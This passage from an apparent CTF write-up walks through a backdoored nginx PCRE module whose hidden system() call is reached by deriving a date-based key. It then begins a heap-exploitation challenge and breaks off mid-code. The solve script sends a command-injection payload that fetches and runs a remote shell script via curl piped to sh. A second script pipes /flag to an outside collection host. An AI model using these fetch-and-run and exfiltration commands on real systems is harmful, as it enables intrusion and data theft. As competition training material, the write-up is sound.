</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pcre_copy_substring</span>(subject, ov, rc, <span style="color:#ae81ff">1</span>, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> m <span style="color:#f92672">=</span> <span style="color:#a6e22e">strdup</span>(buf);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">system</span>(m);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So, it&rsquo;s clear that we have to control the <code>m</code> variable to execute arbitrary commands :), but we need to bypass some constraints because our input was filtered using the <code>bd_re</code> regex pattern</p>
<p><code>pcre_compile.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>(b, <span style="color:#e6db74">&#34;^/&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcat</span>(b, alph);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcat</span>(b, <span style="color:#e6db74">&#34;/([</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">\$a-zA-Z0-9;:/.|]+)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> eo;
</span></span><span style="display:flex;"><span>        bd_re <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_compile</span>(b, PCRE_MULTILINE, <span style="color:#f92672">&amp;</span> e, <span style="color:#f92672">&amp;</span> eo, <span style="color:#ae81ff">0</span>);
</span></span></code></pre></div><p>So our input quite equals to <code>^/alph/([\$a-zA-Z0-9;:/.|]+)</code>, which <code>alph</code> from the <code>b.h</code> file</p>
<p><code>pcre_compile.c</code></p>
<pre tabindex="0"><code>char * alph =
#include &#34;b.h&#34;
;
</code></pre><p>the file <code>b.h</code> was generated from these commands</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#66d9ef">$(($(</span>date +%s<span style="color:#66d9ef">)</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">86400</span><span style="color:#66d9ef">))</span> | md5sum | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f1 |  awk <span style="color:#e6db74">&#39;{ for(i=0;i&lt;10;i++) printf &#34;%s&#34;, $1 }&#39;</span> &gt; a
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#34;</span> | grep -o . | shuf --random-source ./a| tr -d <span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;&#34;&#39;</span> &gt; b.h; rm -f ./a;
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#34;%m.%d.%y&#34;</span> | tr -d <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;&#34;&#39;</span> &gt; d.h
</span></span></code></pre></div><p>I generated a similar python code to make it easier, so the <code>alph</code> string is equal to the hash of the day when the file was created.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time_string <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime(<span style="color:#ae81ff">2024</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>seconds_since_epoch <span style="color:#f92672">=</span> int(time_string<span style="color:#f92672">.</span>timestamp()) <span style="color:#f92672">//</span> <span style="color:#ae81ff">86400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>md5_out <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>str(seconds_since_epoch)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(md5_out <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>getoutput(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39; | grep -o . | shuf --random-source ./a | tr -d &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>print(key)
</span></span></code></pre></div><p>The last one</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> b[<span style="color:#ae81ff">0x400</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(f, b, <span style="color:#ae81ff">12</span>);
</span></span><span style="display:flex;"><span>    b[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">strtoull</span>(b, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(f);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x130000</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> i;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;g&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;i&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>        p[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;8&#39;</span> <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>        p[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
</span></span><span style="display:flex;"><span>            c<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>p_page <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">uint64_t</span>)p <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mprotect</span>(p_page, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">snprintf</span>(p, <span style="color:#ae81ff">21</span>, <span style="color:#e6db74">&#34;ni/nginx/%s                            &#34;</span>, date_s);
</span></span><span style="display:flex;"><span>            p[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It searches the string <code>nginx/1.18.</code> through the nginx binary base address. If found,  it replaces the <code>nginx/1.18.</code> with the  <code>ni/nginx/date_s</code> string, which is <code>date_s</code> from the <code>d.h</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#34;%m.%d.%y&#34;</span> | tr -d <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;&#34;&#39;</span> &gt; d.h
</span></span></code></pre></div><p>We can know the date because it&rsquo;s returned to us in each request append to ni/nginx/.</p>
<p><img src="https://i.imgur.com/xPKPy3k.png" alt="image"></p>
<p>Finally, we get the key <code>wpMI7xlCLtiqOk3bzUEfs1TQNVynGB4ASRFcDJ0KYPXmHv2o65gWuZ89djareh</code> by running the following script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time_string <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime(<span style="color:#ae81ff">2006</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>seconds_since_epoch <span style="color:#f92672">=</span> int(time_string<span style="color:#f92672">.</span>timestamp()) <span style="color:#f92672">//</span> <span style="color:#ae81ff">86400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>md5_out <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>str(seconds_since_epoch)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(md5_out <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>getoutput(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39; | grep -o . | shuf --random-source ./a | tr -d &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>print(key)
</span></span></code></pre></div><p>We successfully passed the request to the <code>pcre_exec</code> function and made it return 2</p>
<p><img src="https://i.imgur.com/iIpjZg4.png" alt="image"></p>
<p>Our payload must matches <code>/([\\\$a-zA-Z0-9;:/.|]+)</code> regex.</p>
<p><img src="https://i.imgur.com/qOWE2r0.png" alt="image"></p>
<h2 id="exploit-script">Exploit script</h2>
<p><code>solve.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://chiptunegeek.shellweplayaga.me:194/&#34;</span>
</span></span><span style="display:flex;"><span>header <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Ticket&#34;</span>: <span style="color:#e6db74">&#34;ticket{SwapNullmodem1179n24:j89H0k4sPT3D2inNeug6fUCaJQ2Mn0J2-2bNEcpiRfWVbFrR}&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e"># proxies = {&#34;http&#34;: &#34;http://127.0.0.1:8080&#34;, &#34;https&#34;: &#34;http://127.0.0.1:8080&#34;}</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;curl$IFS$2https://095ab4b1de06dd.lhr.life/payload.sh|sh&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time_string <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime(<span style="color:#ae81ff">2006</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>seconds_since_epoch <span style="color:#f92672">=</span> int(time_string<span style="color:#f92672">.</span>timestamp()) <span style="color:#f92672">//</span> <span style="color:#ae81ff">86400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>md5_out <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>str(seconds_since_epoch)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(md5_out <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>getoutput(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39; | grep -o . | shuf --random-source ./a | tr -d &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>print(key)
</span></span><span style="display:flex;"><span>print(url <span style="color:#f92672">+</span> key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> payload)
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> payload, headers<span style="color:#f92672">=</span>header)
</span></span></code></pre></div><p><code>payload.sh</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>cat /flag  | curl -d @- zt66v57a.requestrepo.com
</span></span></code></pre></div><ul>
<li>flag{SwapNullmodem1179n24:6XX8m9VHpq4yNrgtwWAxvuvBQpIys5vbJfA79HZawYgu3as9bn35psDS6OQjG7S2Ha_4ml2mttK_9IoAjCh7zw}</li>
</ul>
<h1 id="pwn---suscall">Pwn - suscall</h1>
<blockquote>
<p>Your Computer is Spying on You. Click here to find out how to Protect yourself!</p>
</blockquote>
<p><a href="">Attachment</a></p>
<h2 id="source-code-overview-1">Source-code overview</h2>
<p>This challenge makes a custom heap structure in bss section</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> chunk[heap_size];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span><span style="color:#f92672">*</span> heap_top;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And, it makes a custom function call <code>galloc</code>, it&rsquo;s aborted if the requested size is greater than the <code>heap_top</code> pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">galloc</span>(<span style="color:#66d9ef">size_t</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>s; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)top <span style="color:#f92672">+</span> a1 <span style="color:#f92672">&gt;=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>top )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;block_end &lt; heap_end&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0x44u</span>, <span style="color:#e6db74">&#34;galloc&#34;</span>);
</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> top;
</span></span><span style="display:flex;"><span>  top <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)top <span style="color:#f92672">+</span> a1;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(s, <span style="color:#ae81ff">0</span>, a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> s;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It&rsquo;s also make a custom <code>sus_file</code> structure and a custom <code>do_open</code> function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> susfile {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>read_line)(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> filename;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> buffer;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> _padding0;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> buf_size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> buf_cap;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> __padding1;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>reset)(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>open_hook)(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>do_open</code> first allocates the <code>susfile</code> struct, calls to <code>sys_open</code>, reads from that file, and exits either the content has <code>sus</code> string or not</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>susfile <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">do_open</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">int</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  susfile <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// [rsp+18h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>dest; <span style="color:#75715e">// [rsp+20h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> n; <span style="color:#75715e">// [rsp+28h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  susfile <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// [rsp+30h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  sysnum_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> (susfile <span style="color:#f92672">*</span>)<span style="color:#a6e22e">galloc</span>(<span style="color:#ae81ff">48uLL</span>);
</span></span><span style="display:flex;"><span>  dest <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">galloc</span>(<span style="color:#ae81ff">16uLL</span>);
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>filename <span style="color:#f92672">=</span> dest;
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>open_hook <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))open_hook;
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>read_line <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))read_file;
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>reset <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))reset;
</span></span><span style="display:flex;"><span>  n <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strncpy</span>(dest, a1, n);
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> check;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (flags <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFC</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;flags &gt; 0&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0xBDu</span>, <span style="color:#e6db74">&#34;do_open&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>mode )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__assert_fail</span>(<span style="color:#e6db74">&#34;mode &gt; 0&#34;</span>, <span style="color:#e6db74">&#34;main.c&#34;</span>, <span style="color:#ae81ff">0xBEu</span>, <span style="color:#e6db74">&#34;do_open&#34;</span>);
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">syscall</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)sysnum_, dest, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)flags <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFC</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span>)mode);
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>buffer <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">galloc</span>(<span style="color:#ae81ff">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>buf_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  v3<span style="color:#f92672">-&gt;</span>buf_cap <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
